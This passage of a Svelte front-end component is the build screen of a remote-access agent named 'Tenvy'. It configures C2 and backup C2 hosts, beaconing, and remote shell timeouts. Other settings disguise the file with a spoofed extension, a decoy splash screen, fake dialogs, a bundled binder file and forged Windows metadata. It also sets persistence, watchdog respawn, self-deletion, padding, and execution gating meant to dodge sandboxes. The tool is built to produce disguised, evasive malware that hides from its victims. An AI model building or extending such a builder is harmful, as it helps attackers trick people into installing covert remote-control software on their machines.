							class="border-emerald-500/40 bg-emerald-500/10 text-[0.65rem] font-medium tracking-wide text-emerald-600 uppercase"
						>
							{badge}
						</Badge>
					{/each}
				</div>
			</div>
			<p class="text-xs text-muted-foreground">
				These safeguards are always embedded into generated builds. Customize the remaining options
				to match your delivery strategy.
			</p>
		</CardHeader>
		<CardContent class="space-y-8">
			{#snippet SplashPreview({ className = '' })}
				<div
					class={`overflow-hidden rounded-lg border border-border/60 ${className}`}
					style={`background:${normalizedSplashBackground};color:${normalizedSplashText};`}
				>
					{#if splashLayout === 'split'}
						<div class="flex flex-col sm:flex-row">
							<div
								class="h-2 w-full sm:h-auto sm:w-2"
								style={`background:${normalizedSplashAccent};`}
							/>
							<div class="flex-1 space-y-3 px-6 py-8 text-left sm:px-8">
								{#if normalizedSplashSubtitle}
									<p class="text-xs font-semibold tracking-wide uppercase opacity-80">
										{normalizedSplashSubtitle}
									</p>
								{/if}
								<h4 class="text-xl font-semibold">{normalizedSplashTitle}</h4>
								<p class="text-sm leading-relaxed opacity-80">{normalizedSplashMessage}</p>
							</div>
						</div>
					{:else}
						<div class="flex flex-col items-center gap-3 px-6 py-8 text-center">
							<div
								class="h-1.5 w-16 rounded-full"
								style={`background:${normalizedSplashAccent};`}
							/>
							<h4 class="text-lg font-semibold">{normalizedSplashTitle}</h4>
							{#if normalizedSplashSubtitle}
								<p class="text-xs font-semibold tracking-wide uppercase opacity-80">
									{normalizedSplashSubtitle}
								</p>
							{/if}
							<p class="text-sm leading-relaxed opacity-80">{normalizedSplashMessage}</p>
						</div>
					{/if}
				</div>
			{/snippet}
			<div class="grid gap-8 xl:grid-cols-[minmax(0,2.35fr)_minmax(0,1fr)]">
				<div class="space-y-8">
					<Tabs bind:value={activeTab} class="space-y-6">
						<TabsList
							class="flex w-full flex-wrap gap-2 rounded-lg border border-border/70 bg-muted/40 p-1"
						>
							<TabsTrigger value="connection" class="flex-1 sm:flex-none">Connection</TabsTrigger>
							<TabsTrigger value="persistence" class="flex-1 sm:flex-none">Persistence</TabsTrigger>
							<TabsTrigger value="execution" class="flex-1 sm:flex-none">Execution</TabsTrigger>
							<TabsTrigger value="presentation" class="flex-1 sm:flex-none"
								>Presentation</TabsTrigger
							>
						</TabsList>

						<TabsContent value="connection" class="space-y-6">
							<section
								class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm"
							>
								<div class="space-y-1">
									<h3 class="text-sm font-semibold">Primary endpoint</h3>
									<p class="text-xs text-muted-foreground">
										Configure how new agents establish their first connection.
									</p>
								</div>
								<div class="grid gap-6 md:grid-cols-2">
									<div class="grid gap-2">
										<Label for="host">Host</Label>
										<Input id="host" placeholder="controller.tenvy.local" bind:value={host} />
									</div>
									<div class="grid gap-2">
										<Label for="port">Port</Label>
										<Input id="port" placeholder="2332" bind:value={port} inputmode="numeric" />
									</div>
									<div class="grid gap-2">
										<Label for="output">Output filename</Label>
										<Input id="output" placeholder="tenvy-client" bind:value={outputFilename} />
										<p class="text-xs text-muted-foreground">
											Final artifact name:
											<code
												class="rounded bg-muted px-1.5 py-0.5 text-[0.7rem] font-semibold text-foreground"
											>
												{effectiveOutputFilename}
											</code>
										</p>
									</div>
									<div class="grid gap-2">
										<Label for="group-tag">Group tag</Label>
										<Input id="group-tag" placeholder="operations-east" bind:value={groupTag} />
										<p class="text-xs text-muted-foreground">
											Optional label used to keep related deployments together.
										</p>
									</div>
								</div>
							</section>

							<section
								class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm"
							>
								<div class="space-y-1">
									<h3 class="text-sm font-semibold">Target platform</h3>
									<p class="text-xs text-muted-foreground">
										Choose the operating system, architecture, and packaging format.
									</p>
								</div>
								<div class="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
									<div class="grid gap-2">
										<Label for="target-os">Target operating system</Label>
										<select
											id="target-os"
											bind:value={targetOS}
											class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50"
										>
											{#each targetOsOptions as option (option.value)}
												<option value={option.value}>{option.label}</option>
											{/each}
										</select>
									</div>
									<div class="grid gap-2">
										<Label for="target-arch">Architecture</Label>
										<select
											id="target-arch"
											bind:value={targetArch}
											class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50"
										>
											{#each architectureOptionsByOS[targetOS] ?? [] as option (option.value)}
												<option value={option.value}>{option.label}</option>
											{/each}
										</select>
									</div>
									<div class="grid gap-2">
										<Label for="extension">File extension</Label>
										<select
											id="extension"
											bind:value={outputExtension}
											class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none disabled:cursor-not-allowed disabled:opacity-50"
										>
											{#each extensionOptionsByOS[targetOS] ?? [] as option (option)}
												<option value={option}>{option}</option>
											{/each}
										</select>
									</div>
									<div class="md:col-span-2 lg:col-span-3">
										<div
											class="space-y-4 rounded-lg border border-dashed border-border/70 bg-background/40 p-4"
										>
											<div class="flex flex-wrap items-center justify-between gap-3">
												<div>
													<p class="text-sm font-semibold">Extension spoofing</p>
													<p class="text-xs text-muted-foreground">
														Append a decoy extension before the actual package to disguise the
														payload.
													</p>
												</div>
												<div class="flex items-center gap-2 text-xs text-muted-foreground">
													<Switch
														bind:checked={extensionSpoofingEnabled}
														aria-label="Toggle extension spoofing"
													/>
													<span>{extensionSpoofingEnabled ? 'Enabled' : 'Disabled'}</span>
												</div>
											</div>
											{#if extensionSpoofingEnabled}
												<div class="grid gap-4 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)]">
													<div class="grid gap-2">
														<Label for="spoof-preset">Common disguises</Label>
														<select
															id="spoof-preset"
															bind:value={extensionSpoofPreset}
															class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none"
														>
															{#each extensionSpoofPresets as preset (preset)}
																<option value={preset}>{preset}</option>
															{/each}
														</select>
														<p class="text-xs text-muted-foreground">
															Select a predefined disguise.
														</p>
													</div>
													<div class="grid gap-2">
														<Label for="spoof-custom">Custom extension</Label>
														<Input
															id="spoof-custom"
															placeholder=".jpg"
															bind:value={extensionSpoofCustom}
														/>
														<p class="text-xs text-muted-foreground">
															Leave blank to use the preset. Letters and numbers only.
														</p>
														{#if extensionSpoofError}
															<p class="text-xs text-red-500">{extensionSpoofError}</p>
														{/if}
													</div>
												</div>
												<p class="text-xs text-muted-foreground">
													Final filename:
													<code
														class="rounded bg-muted px-1.5 py-0.5 text-[0.7rem] font-semibold text-foreground"
													>
														{effectiveOutputFilename}
													</code>
												</p>
											{:else}
												<p class="text-xs text-muted-foreground">
													Disabled. The agent will be saved as
													<code
														class="rounded bg-muted px-1.5 py-0.5 text-[0.7rem] font-semibold text-foreground"
													>
														{sanitizedOutputBase}{outputExtension}
													</code>
													.
												</p>
											{/if}
										</div>
									</div>
								</div>
							</section>

							<section
								class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm"
							>
								<div class="flex flex-wrap items-center justify-between gap-2">
									<div class="space-y-1">
										<h3 class="text-sm font-semibold">Backup C2 endpoints</h3>
										<p class="text-xs text-muted-foreground">
											Provide failover hosts that will be attempted if the primary controller is
											unreachable.
										</p>
									</div>
									<Button type="button" variant="outline" size="sm" onclick={addFallbackEndpoint}>
										<Plus class="h-4 w-4" />
										Add endpoint
									</Button>
								</div>
								<div class="space-y-3">
									{#each fallbackEndpoints as endpoint, index (index)}
										<div
											class="grid gap-2 md:grid-cols-[minmax(0,1.5fr)_minmax(0,1fr)_auto] md:items-center"
										>
											<input
												class={inputFieldClasses}
												placeholder="controller-backup.tenvy.local"
												value={endpoint.host}
												oninput={(event) =>
													setFallbackEndpoint(index, 'host', inputValueFromEvent(event))}
											/>
											<input
												class={inputFieldClasses}
												placeholder="2332"
												value={endpoint.port}
												inputmode="numeric"
												oninput={(event) =>
													setFallbackEndpoint(index, 'port', inputValueFromEvent(event))}
											/>
											<Button
												type="button"
												variant="ghost"
												size="sm"
												class="text-destructive hover:text-destructive"
												onclick={() => removeFallbackEndpoint(index)}
											>
												<Trash2 class="h-4 w-4" />
												<span class="sr-only">Remove endpoint</span>
											</Button>
										</div>
									{/each}
								</div>
							</section>

							<section
								class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm"
							>
								<div class="space-y-1">
									<h3 class="text-sm font-semibold">Network tuning</h3>
									<p class="text-xs text-muted-foreground">
										Adjust beacon cadence and customize outbound requests.
									</p>
								</div>
								<div class="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
									<div class="grid gap-2">
										<Label for="poll-interval">Poll interval (ms)</Label>
										<Input
											id="poll-interval"
											placeholder="5000"
											bind:value={pollIntervalMs}
											inputmode="numeric"
										/>
										<p class="text-xs text-muted-foreground">
											Leave blank to inherit the server-provided interval. Minimum 1 second.
										</p>
									</div>
									<div class="grid gap-2">
										<Label for="max-backoff">Max backoff (ms)</Label>
										<Input
											id="max-backoff"
											placeholder="30000"
											bind:value={maxBackoffMs}
											inputmode="numeric"
										/>
										<p class="text-xs text-muted-foreground">
											Controls the retry ceiling when reconnecting. Leave blank to use defaults.
										</p>
									</div>
									<div class="grid gap-2">
										<Label for="shell-timeout">Shell timeout (s)</Label>
										<Input
											id="shell-timeout"
											placeholder="30"
											bind:value={shellTimeoutSeconds}
											inputmode="numeric"
										/>
										<p class="text-xs text-muted-foreground">
											Applies to remote shell commands without explicit overrides.
										</p>
									</div>
								</div>
								<div class="space-y-6 rounded-lg border border-dashed border-border/70 p-4">
									<div class="flex flex-wrap items-center justify-between gap-2">
										<div>
											<p class="text-sm font-semibold">Network customization</p>
											<p class="text-xs text-muted-foreground">
												Override HTTP headers or cookies embedded in beacon traffic.
											</p>
										</div>
										<Badge
											variant="outline"
											class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
										>
											Advanced
										</Badge>
									</div>
									<div class="space-y-3">
										<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
											Custom headers
										</p>
										<div class="space-y-3">
											{#each customHeaders as header, index (index)}
												<div
													class="grid gap-2 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)_auto] md:items-center"
												>
													<input
														class={inputFieldClasses}
														placeholder="Header name"
														value={header.key}
														oninput={(event) =>
															updateCustomHeader(index, 'key', inputValueFromEvent(event))}
													/>
													<input
														class={inputFieldClasses}
														placeholder="Header value"
														value={header.value}
														oninput={(event) =>
															updateCustomHeader(index, 'value', inputValueFromEvent(event))}
													/>
													<Button
														type="button"
														variant="ghost"
														size="sm"
														class="text-destructive hover:text-destructive"
														onclick={() => removeCustomHeader(index)}
													>
														<Trash2 class="h-4 w-4" />
														<span class="sr-only">Remove header</span>
													</Button>
												</div>
											{/each}
										</div>
										<Button
											type="button"
											variant="ghost"
											size="sm"
											class="text-xs font-semibold tracking-wide text-muted-foreground uppercase"
											onclick={addCustomHeader}
										>
											<Plus class="h-4 w-4" />
											Add header
										</Button>
									</div>
									<div class="space-y-3">
										<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
											Custom cookies
										</p>
										<div class="space-y-3">
											{#each customCookies as cookie, index (index)}
												<div
													class="grid gap-2 md:grid-cols-[minmax(0,1fr)_minmax(0,1fr)_auto] md:items-center"
												>
													<input
														class={inputFieldClasses}
														placeholder="Cookie name"
														value={cookie.name}
														oninput={(event) =>
															updateCustomCookie(index, 'name', inputValueFromEvent(event))}
													/>
													<input
														class={inputFieldClasses}
														placeholder="Cookie value"
														value={cookie.value}
														oninput={(event) =>
															updateCustomCookie(index, 'value', inputValueFromEvent(event))}
													/>
													<Button
														type="button"
														variant="ghost"
														size="sm"
														class="text-destructive hover:text-destructive"
														onclick={() => removeCustomCookie(index)}
													>
														<Trash2 class="h-4 w-4" />
														<span class="sr-only">Remove cookie</span>
													</Button>
												</div>
											{/each}
										</div>
										<Button
											type="button"
											variant="ghost"
											size="sm"
											class="text-xs font-semibold tracking-wide text-muted-foreground uppercase"
											onclick={addCustomCookie}
										>
											<Plus class="h-4 w-4" />
											Add cookie
										</Button>
									</div>
								</div>
							</section>
						</TabsContent>

						<TabsContent value="persistence" class="space-y-6">
							<section
								class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm"
							>
								<div class="space-y-1">
									<h3 class="text-sm font-semibold">Installation</h3>
									<p class="text-xs text-muted-foreground">
										Define where the agent writes itself and how instances coexist.
									</p>
								</div>
								<div class="space-y-6">
									<div class="grid gap-2">
										<Label for="path">Installation path</Label>
										<Input
											id="path"
											placeholder="/usr/local/bin/tenvy"
											bind:value={installationPath}
										/>
										<div class="flex flex-wrap items-center gap-2 text-xs text-muted-foreground">
											<span class="font-medium text-muted-foreground/80">Quick fill:</span>
											{#each installationPathPresets as preset (preset.value)}
												<Button
													type="button"
													variant="ghost"
													size="sm"
													class="h-7 rounded-full border border-border/70 px-3 text-[0.65rem] font-semibold text-muted-foreground hover:bg-muted"
													onclick={() => applyInstallationPreset(preset.value)}
												>
													{preset.label}
												</Button>
											{/each}
										</div>
									</div>
									<div class="grid gap-2">
										<Label for="mutex">Mutex name</Label>
										<div class="flex flex-col gap-2 sm:flex-row sm:items-center">
											<Input
												id="mutex"
												placeholder="Ensures only a single instance can run"
												class="sm:flex-1"
												bind:value={mutexName}
											/>
											<Button
												type="button"
												variant="outline"
												size="sm"
												class="shrink-0"
												onclick={() => generateMutexName()}
											>
												<Wand2 class="h-4 w-4" />
												Generate
											</Button>
										</div>
										<p class="text-xs text-muted-foreground">
											Optional. Leave blank to allow multiple instances. Unsupported characters are
											replaced automatically.
										</p>
									</div>
								</div>
							</section>

							<section
								class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm"
							>
								<div class="space-y-1">
									<h3 class="text-sm font-semibold">Persistence features</h3>
									<p class="text-xs text-muted-foreground">
										Toggle startup behavior, resilience, and binary padding options.
									</p>
								</div>
								<div class="grid gap-6 md:grid-cols-2 xl:grid-cols-3">
									<div
										class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
									>
										<div>
											<p class="text-sm font-medium">Melt after run</p>
											<p class="text-xs text-muted-foreground">
												Remove the staging binary after installation completes.
											</p>
										</div>
										<Switch
											bind:checked={meltAfterRun}
											aria-label="Toggle whether the temporary binary deletes itself"
										/>
									</div>
									<div
										class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
									>
										<div>
											<p class="text-sm font-medium">Startup on boot</p>
											<p class="text-xs text-muted-foreground">
												Persist the agent path so it can be launched automatically on boot.
											</p>
										</div>
										<Switch
											bind:checked={startupOnBoot}
											aria-label="Toggle startup persistence preference"
										/>
									</div>
									<div
										class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
									>
										<div>
											<p class="text-sm font-medium">Developer mode</p>
											<p class="text-xs text-muted-foreground">
												Keep the console window visible to surface runtime logs and errors.
											</p>
										</div>
										<Switch
											bind:checked={developerMode}
											aria-label="Toggle developer mode console visibility"
										/>
									</div>
									<div
										class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
									>
										<div>
											<p class="text-sm font-medium">Binary compression</p>
											<p class="text-xs text-muted-foreground">
												Strip debug symbols and compress the executable when possible.
											</p>
										</div>
										<Switch bind:checked={compressBinary} aria-label="Toggle binary compression" />
									</div>
									<div
										class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
									>
										<div>
											<p class="text-sm font-medium">Require administrator</p>
											<p class="text-xs text-muted-foreground">
												Abort launch unless elevated privileges are detected at runtime.
											</p>
										</div>
										<Switch
											bind:checked={forceAdmin}
											aria-label="Toggle administrator requirement"
										/>
									</div>
									<div
										class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
									>
										<div class="w-full">
											<p class="text-sm font-medium">Watchdog</p>
											<p class="text-xs text-muted-foreground">
												Respawn the agent if the process is terminated unexpectedly.
											</p>
											{#if watchdogEnabled}
												<div class="mt-3 grid gap-1 text-xs">
													<Label
														for="watchdog-interval"
														class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
													>
														Respawn delay (s)
													</Label>
													<Input
														id="watchdog-interval"
														class="h-8 text-xs"
														placeholder="60"
														bind:value={watchdogIntervalSeconds}
														inputmode="numeric"
													/>
												</div>
											{/if}
										</div>
										<Switch bind:checked={watchdogEnabled} aria-label="Toggle watchdog respawn" />
									</div>
									<div
										class="flex items-start justify-between gap-4 rounded-lg border border-border bg-muted/30 p-4"
									>
										<div class="w-full">
											<p class="text-sm font-medium">File pumper</p>
											<p class="text-xs text-muted-foreground">
												Pad the binary with random data to reach a desired minimum size.
											</p>
											{#if enableFilePumper}
												<div
													class="mt-3 grid gap-3 text-xs sm:grid-cols-[minmax(0,1fr)_auto] sm:items-end"
												>
													<div class="grid gap-1">
														<Label
															for="file-pumper-size"
															class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
														>
															Target size
														</Label>
														<Input
															id="file-pumper-size"
															class="h-8 text-xs"
															placeholder="500"
															bind:value={filePumperTargetSize}
															inputmode="numeric"
														/>
													</div>
													<div class="grid gap-1">
														<Label
															for="file-pumper-unit"
															class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
														>
															Unit
														</Label>
														<select
															id="file-pumper-unit"
															bind:value={filePumperUnit}
															class="flex h-8 w-full items-center justify-between rounded-md border border-input bg-background px-2 text-xs ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none"
														>
															{#each filePumperUnits as unit (unit)}
																<option value={unit}>{unit}</option>
															{/each}
														</select>
													</div>
												</div>
											{/if}
										</div>
										<Switch bind:checked={enableFilePumper} aria-label="Toggle file pumper" />
									</div>
								</div>
							</section>
						</TabsContent>

						<TabsContent value="execution" class="space-y-6">
							<section
								class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm"
							>
								<div class="flex flex-wrap items-center justify-between gap-2">
									<div>
										<p class="text-sm font-semibold">Execution triggers</p>
										<p class="text-xs text-muted-foreground">
											Gate execution behind environmental cues to reduce sandbox exposure.
										</p>
									</div>
									<Badge
										variant="outline"
										class="text-[0.65rem] font-semibold tracking-wide text-muted-foreground uppercase"
									>
										Optional
									</Badge>
								</div>
								<div class="grid gap-4 md:grid-cols-2">
									<div class="grid gap-2">
										<Label for="execution-delay">Delayed start (seconds)</Label>
										<Input
											id="execution-delay"
											placeholder="30"
											bind:value={executionDelaySeconds}
											inputmode="numeric"
										/>
										<p class="text-xs text-muted-foreground">Leave blank to run immediately.</p>
									</div>
									<div class="grid gap-2">
										<Label for="execution-uptime">Minimum system uptime (minutes)</Label>
										<Input
											id="execution-uptime"
											placeholder="10"
											bind:value={executionMinUptimeMinutes}
											inputmode="numeric"
										/>
										<p class="text-xs text-muted-foreground">
											Helps avoid sandboxes that reboot frequently.
										</p>
									</div>
									<div class="grid gap-2">
										<Label for="execution-usernames">Allowed usernames</Label>
										<Input
											id="execution-usernames"
											placeholder="administrator,svc-account"
											bind:value={executionAllowedUsernames}
										/>
										<p class="text-xs text-muted-foreground">
											Only execute when the current user matches one of these entries.
										</p>
									</div>
									<div class="grid gap-2">
										<Label for="execution-locales">Allowed locales</Label>
										<Input
											id="execution-locales"
											placeholder="en-US, fr-FR"
											bind:value={executionAllowedLocales}
										/>
										<p class="text-xs text-muted-foreground">
											Restrict execution to systems with matching locale identifiers.
										</p>
									</div>
									<div class="grid gap-2">
										<Label for="execution-start">Earliest run time</Label>
										<Input
											id="execution-start"
											type="datetime-local"
											bind:value={executionStartDate}
										/>
									</div>
									<div class="grid gap-2">
										<Label for="execution-end">Latest run time</Label>
										<Input id="execution-end" type="datetime-local" bind:value={executionEndDate} />
									</div>
								</div>
								<div
									class="flex items-center justify-between gap-4 rounded-md border border-border/60 bg-muted/30 px-4 py-3 text-xs"
								>
									<div>
										<p class="font-medium">Require internet connectivity</p>
										<p class="text-muted-foreground">
											Delay execution until a network connection is available.
										</p>
									</div>
									<Switch
										bind:checked={executionRequireInternet}
										aria-label="Toggle internet connectivity requirement"
									/>
								</div>
							</section>
						</TabsContent>

						<TabsContent value="presentation" class="space-y-6">
							<section
								class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm"
							>
								<div>
									<p class="text-sm font-semibold">Presentation</p>
									<p class="text-xs text-muted-foreground">
										Blend the installer with an optional binder payload or decoy dialog.
									</p>
								</div>
								<div class="space-y-3">
									<Label for="binder-file">Binder payload</Label>
									<div
										class="flex flex-col gap-3 rounded-lg border border-dashed border-border/60 p-4"
									>
										<input
											id="binder-file"
											type="file"
											class="text-xs"
											onchange={handleBinderSelection}
										/>
										{#if binderFileName}
											<div
												class="flex items-center justify-between gap-3 rounded-md bg-muted/40 px-3 py-2 text-xs"
											>
												<div>
													<p class="font-medium">{binderFileName}</p>
													{#if binderFileSize}
														<p class="text-muted-foreground">{formatFileSize(binderFileSize)}</p>
													{/if}
												</div>
												<button
													type="button"
													class="text-primary underline"
													onclick={clearBinderSelection}
												>
													Remove
												</button>
											</div>
										{/if}
										{#if binderFileError}
											<p class="text-xs text-red-500">{binderFileError}</p>
										{/if}
										<p class="text-xs text-muted-foreground">
											Optional. Attach an additional file to deploy alongside the agent.
										</p>
									</div>
								</div>
								<div class="grid gap-4 md:grid-cols-2">
									<div class="grid gap-2">
										<Label for="fake-dialog-type">Fake dialog</Label>
										<select
											id="fake-dialog-type"
											bind:value={fakeDialogType}
											class="flex h-10 w-full items-center justify-between rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:outline-none"
										>
											{#each fakeDialogOptions as option (option.value)}
												<option value={option.value}>{option.label}</option>
											{/each}
										</select>
									</div>
									<div class="grid gap-2">
										<Label for="fake-dialog-title">Dialog title</Label>
										<Input
											id="fake-dialog-title"
											placeholder="Installation complete"
											bind:value={fakeDialogTitle}
											disabled={fakeDialogType === 'none'}
										/>
									</div>
									<div class="grid gap-2 md:col-span-2">
										<Label for="fake-dialog-message">Dialog message</Label>
										<Textarea
											id="fake-dialog-message"
											placeholder="The setup completed successfully."
											bind:value={fakeDialogMessage}
											class="min-h-[120px]"
											disabled={fakeDialogType === 'none'}
										/>
										<p class="text-xs text-muted-foreground">
											Leave blank to use sensible defaults based on the dialog type.
										</p>
									</div>
								</div>
								<div class="space-y-4 rounded-lg border border-dashed border-border/60 p-4">
									<div class="flex flex-wrap items-center justify-between gap-3">
										<div>
											<p class="text-sm font-semibold">Custom splash screen</p>
											<p class="text-xs text-muted-foreground">
												Display a decoy splash overlay before the agent begins execution.
											</p>
										</div>
										<div class="flex items-center gap-3">
											<div class="flex items-center gap-2 text-xs text-muted-foreground">
												<Switch
													bind:checked={splashScreenEnabled}
													aria-label="Toggle splash screen"
												/>
												<span>{splashScreenEnabled ? 'Enabled' : 'Disabled'}</span>
											</div>
											<Button
												type="button"
												variant="outline"
												size="sm"
												onclick={() => (splashDialogOpen = true)}
											>
												Customize
											</Button>
										</div>
									</div>
									{#if splashScreenEnabled}
										<div class="space-y-3">
											<div class="flex flex-wrap items-center gap-2 text-xs text-muted-foreground">
												<Badge
													variant="outline"
													class="text-[0.65rem] font-semibold tracking-wide uppercase"
												>
													{splashLayoutLabel}
												</Badge>
												<span class="flex items-center gap-1">
													Accent
													<span
														class="h-3 w-3 rounded-full border border-border/70"
														style={`background:${normalizedSplashAccent};`}
													/>
												</span>
											</div>
											{@render SplashPreview({
												className: splashScreenEnabled ? '' : 'opacity-60'
											})}
										</div>
									{:else}
										<p class="text-xs text-muted-foreground">
											Disabled. Toggle the splash screen on to expose customization controls.
										</p>
									{/if}
								</div>
							</section>

							{#if isWindowsTarget}
								<section
									class="space-y-6 rounded-lg border border-border/70 bg-background/60 p-6 shadow-sm"
								>
									<div class="space-y-3">
										<Label for="file-icon">Executable icon</Label>
										<div
											class="flex flex-col gap-3 rounded-lg border border-dashed border-border/60 p-4"
										>
											<input
												id="file-icon"
												type="file"
												accept=".ico"
												class="text-xs"
												onchange={handleIconSelection}
											/>
											{#if fileIconName}
												<div
													class="flex items-center justify-between rounded-md bg-muted/40 px-3 py-2 text-xs"
												>
													<span class="font-medium">{fileIconName}</span>
													<button
														type="button"
														class="text-primary underline"
														onclick={clearIconSelection}
													>
														Remove
													</button>
												</div>
											{/if}
											{#if fileIconError}
												<p class="text-xs text-red-500">{fileIconError}</p>
											{/if}
											<p class="text-xs text-muted-foreground">
												Optional. Accepted format: .ico (max 512KB). Only applied to Windows builds.
											</p>
										</div>
									</div>

									<Collapsible
										class="rounded-lg border border-border/70 p-4"
										bind:open={fileInformationOpen}
									>
										<div class="flex flex-wrap items-center justify-between gap-3">
											<div>
												<h3 class="text-sm font-semibold">File information</h3>
												<p class="text-xs text-muted-foreground">
													Populate Windows version metadata for the compiled binary.
												</p>
											</div>
											<CollapsibleTrigger
												class="flex items-center gap-2 rounded-md border border-border/60 px-3 py-1.5 text-xs font-semibold tracking-wide text-muted-foreground uppercase transition hover:bg-muted"
											>
												<span>{fileInformationOpen ? 'Hide metadata' : 'Show metadata'}</span>
												<ChevronDown
													class={`h-4 w-4 transition-transform ${fileInformationOpen ? 'rotate-180' : ''}`}
												/>
											</CollapsibleTrigger>
										</div>
										<CollapsibleContent class="mt-4 space-y-4">
											<div class="grid gap-4 md:grid-cols-2">
												<div class="grid gap-2">
													<Label for="file-description">File description</Label>
													<Input
														id="file-description"
														placeholder="Background client"
														bind:value={fileInformation.fileDescription}
													/>
												</div>
												<div class="grid gap-2">
													<Label for="product-name">Product name</Label>
													<Input
														id="product-name"
														placeholder="Tenvy Agent"
														bind:value={fileInformation.productName}
													/>
												</div>
												<div class="grid gap-2">
													<Label for="company-name">Company name</Label>
													<Input
														id="company-name"
														placeholder="Tenvy Operators"
														bind:value={fileInformation.companyName}
													/>
												</div>
												<div class="grid gap-2">
													<Label for="product-version">Product version</Label>
													<Input
														id="product-version"
														placeholder="1.0.0.0"
														bind:value={fileInformation.productVersion}
													/>
												</div>
												<div class="grid gap-2">
													<Label for="file-version">File version</Label>
													<Input
														id="file-version"
														placeholder="1.0.0.0"
														bind:value={fileInformation.fileVersion}
													/>
												</div>
												<div class="grid gap-2">
													<Label for="original-filename">Original filename</Label>
													<Input
														id="original-filename"
														placeholder="tenvy-client.exe"
														bind:value={fileInformation.originalFilename}
													/>
												</div>
												<div class="grid gap-2">
													<Label for="internal-name">Internal name</Label>
													<Input
														id="internal-name"
														placeholder="tenvy-client"
														bind:value={fileInformation.internalName}
													/>
												</div>
												<div class="grid gap-2">
													<Label for="legal-copyright">Legal copyright</Label>
													<Input
														id="legal-copyright"
														placeholder="© 2025 Tenvy"
														bind:value={fileInformation.legalCopyright}
													/>
												</div>
											</div>
										</CollapsibleContent>
									</Collapsible>
								</section>
							{/if}
						</TabsContent>
					</Tabs>
				</div>
				<aside class="space-y-4 xl:sticky xl:top-24">
					<div class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6">
						<div class="flex items-start justify-between gap-3">
							<div class="space-y-1">
								<h3 class="text-sm font-semibold">Build status</h3>
								<p class="text-xs text-muted-foreground">
									Monitor compilation progress and download artifacts.
								</p>
							</div>
							<Badge variant="outline" class={buildStatusBadgeClasses(buildStatus)}
								>{buildStatusLabel(buildStatus)}</Badge
							>
						</div>

						{#if buildStatus === 'idle'}
							<p class="text-xs text-muted-foreground">
								Start a build to view progress updates, download links, and generated secrets.
							</p>
						{:else}
							<div class="space-y-4">
								<div class="space-y-2">
									<div class="flex items-center justify-between text-sm">
										<span class="font-medium">Progress</span>
										<span>{buildProgress}%</span>
									</div>
									<Progress value={buildProgress} max={100} class="h-2" />
								</div>
								<ul class="space-y-2 text-sm">
									{#each progressMessages as message (message.id)}
										{#if message}
											{@const Icon = toneIcon(message.tone)}
											<li class={`flex items-start gap-2 ${messageToneClasses(message.tone)}`}>
												<Icon class="mt-0.5 h-4 w-4" />
												<span class="text-left">{message.text}</span>
											</li>
										{/if}
									{/each}
								</ul>
								{#if downloadUrl || outputPath}
									<div class="rounded-md bg-muted/50 p-3 text-xs">
										{#if downloadUrl}
											<p class="flex flex-wrap items-center gap-1">
												<span>Download:</span>
												<a
													class="font-medium text-primary underline"
													href={resolve(downloadUrl)}
													rel="external"
													target="_blank"
													download>agent binary</a
												>
											</p>
										{/if}
										{#if outputPath}
											<p class="mt-1 break-words text-muted-foreground">Saved to {outputPath}</p>
										{/if}
									</div>
								{/if}
								{#if buildLog.length}
									<div>
										<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
											Build log
										</p>
										<pre
											class="mt-2 max-h-48 overflow-auto rounded-md bg-muted/40 p-3 font-mono text-xs">
                                                                                        {buildLog.join(
												'\n'
											)}
                                                                                </pre>
									</div>
								{/if}
								{#if generatedSecret}
									<div class="rounded-md border border-border/70 bg-muted/30 p-3 text-xs">
										<p class="font-semibold text-muted-foreground">Generated shared secret</p>
										<p class="mt-1 font-mono text-sm">{generatedSecret}</p>
										<p class="mt-1 text-xs text-muted-foreground">
											Store this value securely. It is embedded in the binary and required for agent
											authentication.
										</p>
										<div class="mt-2 flex flex-wrap items-center gap-2 text-xs">
